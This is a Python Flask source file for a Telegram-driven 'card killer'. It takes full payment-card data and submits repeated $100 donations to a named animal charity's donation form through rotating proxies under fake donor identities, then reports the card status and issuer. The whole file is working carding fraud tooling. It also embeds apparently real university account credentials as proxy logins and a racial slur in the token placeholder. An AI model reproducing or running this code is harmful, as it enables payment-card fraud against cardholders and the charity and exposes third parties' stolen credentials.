#@diwazz

from flask import Flask, request, jsonify
import requests
import re
import threading
import random
import time

app = Flask(__name__)
BOT_TOKEN = 'Nigga Your Bot Token '
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"

PROXY_LIST = [
    "gorkem.oynar@ogr.deu.edu.tr:Parola54@193.140.151.155:13128",
    "soner.sarisaltik@ogr.deu.edu.tr:Ss147852@193.140.151.155:13128",
    "2017681002@ogr.deu.edu.tr:Sami1453@193.140.151.155:13128",
    "2018215002@ogr.deu.edu.tr:Huso3550@193.140.151.155:13128",
    "2018300556@ogr.deu.edu.tr:End10037618@193.140.151.85:13128",
    "gorkem.oynar@ogr.deu.edu.tr:Parola54@193.140.151.85:13128",
]

FAKE_DETAILS_POOL = [
    {"first": "John", "last": "Smith", "address": "123 Oak St", "city": "Springfield", "state": "IL", "zip": "62704"},
    {"first": "Emily", "last": "Jones", "address": "456 Maple Ave", "city": "Riverside", "state": "CA", "zip": "92501"},
    {"first": "Michael", "last": "Williams", "address": "789 Pine Ln", "city": "Georgetown", "state": "TX", "zip": "78626"},
    {"first": "Jessica", "last": "Brown", "address": "101 Elm Ct", "city": "Franklin", "state": "TN", "zip": "37064"},
    {"first": "David", "last": "Davis", "address": "212 Birch Rd", "city": "Madison", "state": "WI", "zip": "53703"},
    {"first": "Sarah", "last": "Miller", "address": "333 Cedar Blvd", "city": "Phoenix", "state": "AZ", "zip": "85001"},
    {"first": "James", "last": "Wilson", "address": "444 Spruce Way", "city": "Denver", "state": "CO", "zip": "80202"},
    {"first": "Jennifer", "last": "Moore", "address": "555 Redwood Dr", "city": "Portland", "state": "OR", "zip": "97201"},
    {"first": "Robert", "last": "Taylor", "address": "666 Aspen Pl", "city": "Seattle", "state": "WA", "zip": "98101"},
    {"first": "Mary", "last": "Anderson", "address": "777 Willow St", "city": "Boston", "state": "MA", "zip": "02108"},
    {"first": "William", "last": "Thomas", "address": "888 Poplar Ave", "city": "Miami", "state": "FL", "zip": "33101"},
    {"first": "Patricia", "last": "Jackson", "address": "999 Magnolia Ct", "city": "Atlanta", "state": "GA", "zip": "30303"},
    {"first": "Richard", "last": "White", "address": "111 Sycamore Rd", "city": "Chicago", "state": "IL", "zip": "60601"},
    {"first": "Linda", "last": "Harris", "address": "222 Dogwood Ln", "city": "Dallas", "state": "TX", "zip": "75201"},
    {"first": "Charles", "last": "Martin", "address": "321 Holly Blvd", "city": "Los Angeles", "state": "CA", "zip": "90001"},
]

def get_random_details(): return random.choice(FAKE_DETAILS_POOL)
def get_random_email(first_name, last_name):
    domain = random.choice(["gmail.com", "yahoo.com", "outlook.com", "proton.me"])
    return f"{first_name.lower()}.{last_name.lower()}{random.randint(100, 999)}@{domain}"
def get_proxy_from_list(proxy_list):
    if not proxy_list: return None
    proxy_str = random.choice(proxy_list)
    return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}

def run_single_kill_attempt(session, cc, mm, yy, cvv, proxy):
    try:
        if len(yy) == 4: yy = yy[-2:]
        details = get_random_details()
        email = get_random_email(details["first"], details["last"])
        token_headers = {'accept': 'application/json, text/javascript, */*; q=0.01','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://secure.farmsanctuary.org','referer': 'https://secure.farmsanctuary.org/donate','x-requested-with': 'XMLHttpRequest','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',}
        token_data = {'js_module': 'springboard_fraud', 'js_callback': 'get_token', 'form_id': 'webform_client_form_442'}
        token_res = session.post('https://secure.farmsanctuary.org/js/springboard_fraud/get_token', headers=token_headers, data=token_data, proxies=proxy, timeout=30)
        try:
            fraud_token = token_res.json()
        except requests.exceptions.JSONDecodeError:
            return {"status": "Declined", "response": "Process Error: Fraud token response was not JSON. (Proxy might be bad or blocked)"}
        if not fraud_token: return {"status": "Declined", "response": "Process Error: Failed to get fraud token."}
        final_headers = {'origin': 'https://secure.farmsanctuary.org','referer': 'https://secure.farmsanctuary.org/donate','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',}
        form_data = {'submitted[donation][amount]': '100','submitted[donor_information][first_name]': details["first"],'submitted[donor_information][last_name]': details["last"],'submitted[donor_information][mail]': email,'submitted[billing_information][address]': details["address"],'submitted[billing_information][city]': details["city"],'submitted[billing_information][state]': details["state"],'submitted[billing_information][zip]': details["zip"],'submitted[billing_information][country]': 'US','submitted[payment_information][payment_method]': 'credit','submitted[payment_information][payment_fields][credit][card_number]': cc,'submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_month]': mm,'submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_year]': f'20{yy}','submitted[payment_information][payment_fields][credit][card_cvv]': cvv,'form_id': 'webform_client_form_442','springboard_fraud_token': fraud_token,}
        final_response = session.post('https://secure.farmsanctuary.org/donate', headers=final_headers, data=form_data, proxies=proxy, timeout=30)
        html_text = final_response.text
        match = re.search(r'<div class="messages error.*?>(.*?)</div>', html_text, re.DOTALL)
        if match:
            error_text = re.sub('<[^<]+?>', '', match.group(1)).strip()
            return {"status": "Declined", "response": error_text}
        elif "Thank you for your gift" in html_text:
            return {"status": "Approved", "response": "Donation successful. Card is live."}
        else:
            return {"status": "Declined", "response": "Unknown response from website."}
    except requests.exceptions.ProxyError:
        return {"status": "Proxy Error", "response": "The proxy failed to connect."}
    except requests.exceptions.RequestException:
        return {"status": "Network Error", "response": "A network error occurred (e.g., timeout)."}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        return response.json() if response.status_code == 200 else {}
    except Exception: return {}

def background_task(chat_id, message_id, full_cc_string):
    session = requests.Session()
    final_status, last_response = "Card Not Killed", ""
    cc, mm, yy, cvv = full_cc_string.split('|')
    available_proxies = PROXY_LIST[:]
    for i in range(1, 16):
        if not available_proxies:
            last_response = "All proxies have failed."; break
        proxy = get_proxy_from_list(available_proxies)
        check_result = run_single_kill_attempt(session, cc, mm, yy, cvv, proxy)
        status, response_message = check_result.get('status'), check_result.get('response', 'No response.')
        last_response = response_message
        if status == "Proxy Error":
            available_proxies.remove(proxy['http'].split('//')[1]); continue
        if status == "Approved":
            final_status = "Card is Live (Approved)"; break
        if "declined" in response_message.lower():
            final_status = f"Card Killed in {i} attempts."; break
        if "unknown response" in response_message.lower():
            final_status = f"Card Killed in {i} attempts (Unknown Response)."; break
        if i == 15: final_status = "Card Not Killed after 15 attempts."
        time.sleep(2)
    bin_info = get_bin_info(cc[:6])
    brand, card_type, country, country_flag, bank = bin_info.get('brand', 'U'), bin_info.get('type', 'U'), bin_info.get('country_name', 'U'), bin_info.get('country_flag', ''), bin_info.get('bank', 'U')
    final_message = f"""<b>Card Killer Result 🔪</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> {final_status}\n<b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {last_response}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""
    requests.post(TELEGRAM_API_URL, json={'chat_id': chat_id, 'message_id': message_id, 'text': final_message, 'parse_mode': 'HTML'})

@app.route('/kill', methods=['POST'])
def kill_endpoint():
    data = request.get_json()
    if not data or 'card' not in data: return jsonify({"error": "Missing card data."}), 400
    thread = threading.Thread(target=background_task, args=(data['chat_id'], data['message_id'], data['card']))
    thread.start()
    return jsonify({"status": "Kill process started in background."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
